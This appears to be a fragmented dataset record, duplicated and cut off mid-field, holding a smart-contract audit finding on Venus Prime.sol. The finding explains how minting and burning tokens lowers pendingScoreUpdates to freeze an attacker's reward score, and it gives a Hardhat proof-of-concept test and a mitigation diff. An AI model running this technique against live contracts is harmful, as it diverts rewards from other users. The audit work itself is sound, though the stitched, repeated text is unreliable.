pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so.

However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score.

        "gtraw": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens\".\n\n\n## Assessed type\n\nOther",

        "gt": "\n# Vulnerability details\n\n## Note\nAll functions/properties referred to are in the `Prime.sol` contract.\n## Impact\nA malicious user can accrue outsized rewards at the expense of other users after `updateAlpha()` or `updateMultipliers()` is called.\n\n## Proof of Concept\nAn attacker can prevent their score from being updated and decreased after the protocol's alpha or multipliers change. This is done by manipulatively decreasing the value of `pendingScoreUpdates`, then ensuring that only other user scores are updated until `pendingScoreUpdates` reaches zero, at which point calls to `updateScores()` will revert with the error `NoScoreUpdatesRequired()`. This can be done via the attacker calling `updateScores()` to update other users' scores first and/or DoSing calls to `updateScores()` that would update the attacker's score (see the issue titled \"DoS and gas griefing of Prime.updateScores()\").\n\nThe core of this vulnerability is the attacker's ability to manipulate `pendingScoreUpdates`. Notice below that `claim()`, which is called to mint a user's Prime token, doesn't change the value of `pendingScoreUpdates`:\n```\n    function claim() external { \n        if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();\n        if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();\n\n        stakedAt[msg.sender] = 0;\n\n        _mint(false, msg.sender);\n        _initializeMarkets(msg.sender);\n    }\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) {\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n\n        emit Mint(user, isIrrevocable);\n    }\n    function _initializeMarkets(address account) internal {\n        address[] storage _allMarkets = allMarkets;\n        for (uint256 i = 0; i < _allMarkets.length; ) {\n            address market = _allMarkets[i];\n            accrueInterest(market);\n\n            interests[market][account].rewardIndex = markets[market].rewardIndex;\n            uint256 score = _calculateScore(market, account);\n            interests[market][account].score = score;\n            markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;\n\n            unchecked {\n                i++;\n            }\n        }\n    }\n```\nHowever, burning a token decrements `pendingScoreUpdates`. (Burning a token is done by withdrawing XVS from `XVSVault.sol` so that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:\n```\n    function _burn(address user) internal {\n        ...\n        _updateRoundAfterTokenBurned(user);\n\n        emit Burn(user);\n    }\n    function _updateRoundAfterTokenBurned(address user) internal { \n        if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;\n\n        if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {\n            pendingScoreUpdates--;\n        }\n    }\n```\nTo inappropriately decrement the value of `pendingScoreUpdates`, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of `!isScoreUpdated[nextScoreUpdateRoundId][user]` is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call to `updateMultipliers()`/`updateAlpha()`. \n\nAs aforementioned, the attacker can ensure that only other users' scores are updated until `pendingScoreUpdates` reaches zero, at which point further calls to `updateScores` will revert with the custom error `NoScoreUpdatesRequired()`.\n\nRelevant code from `updateScores()` for reference:\n```\n    function updateScores(address[] memory users) external {\n        if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired(); \n        if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();\n\n        for (uint256 i = 0; i < users.length; ) {\n            ...\n            pendingScoreUpdates--;\n            isScoreUpdated[nextScoreUpdateRoundId][user] = true;\n\n            unchecked {\n                i++;\n            }\n\n            emit UserScoreUpdated(user);\n        }\n    }\n```\nAs seen, the attacker's score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker's score. Because rewards are distributed according to the user's score divided by the total score, the attacker can 'freeze' their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.\n\nThe attacker can also prevent score updates for other users. The attacker can 'freeze' a user's score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value of `pendingScoreUpdates` by more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.\n\n## Math to support that a larger score results in greater reward accrual\nLet $a$ represent the attacker's score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker's larger unupdated score and the attacker's smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a<b$ :\n\n$\\frac{a+c}{b+c} > \\frac{a}{b} \\iff a+c > \\frac{a(b+c)}{b} \\iff a+c > a+\\frac{ac}{b}$\n## Test\nPaste and run the below test in the 'mint and burn' scenario in Prime.ts (line 302)\n```\n    it(\"prevent_Update\", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`\n      //setup 3 users\n      await prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);\n      await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker sets up addresses to mint/burn and manipulate pendingScoreUpdates\n      const [,,,,user4,user5] = await ethers.getSigners();\n      await xvs.transfer(user4.address, bigNumber18.mul(1000000));\n      await xvs.transfer(user5.address, bigNumber18.mul(1000000));\n      await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));\n      await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));\n      await mine(90 * 24 * 60 * 60);\n      //change alpha, pendingScoreUpdates changed to 3\n      await prime.updateAlpha(1, 5);\n      //attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2\n      await prime.connect(user4).claim();\n      await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      await prime.connect(user5).claim();\n      await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));\n      //attacker updates user 3, decreasing pendingScoreUpdates by 1\n      await prime.connect(user1).updateScores([user3.getAddress()])\n      //users 1 and 2 won't be updated because pendingScoreUpdates is 0\n      await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, \"NoScoreUpdatesRequired\");\n    });\n```\n## Tools Used\nHardhat\n## Recommended Mitigation Steps\nCheck if `pendingScoreUpdates` is nonzero when a token is minted, and increment it if so. This removes the attacker's ability to manipulate `pendingScoreUpdates`.\n```diff\n    function _mint(bool isIrrevocable, address user) internal {\n        if (tokens[user].exists) revert IneligibleToClaim();\n\n        tokens[user].exists = true;\n        tokens[user].isIrrevocable = isIrrevocable;\n\n        if (isIrrevocable) { //@Gas\n            totalIrrevocable++;\n        } else {\n            totalRevocable++;\n        }\n\n        if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();\n+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}} \n\n        emit Mint(user, isIrrevocable);\n    }\n```\n## Further Considerations\nThe call to `updateMultipliers()` can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker's score before 'freezing' it.\n\nIf the attacker wants to keep the inflated score, no actions that update the attacker's score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired since `claimInterest()` does not update user scores.\n\nIf anyone has knowledge that the exploit has occurred, it is possible for any user's score in a market to be updated with a call to `accrueInterestAndUpdateScore()`, which can neutralize the attack.\n\nThe required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled \"Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum 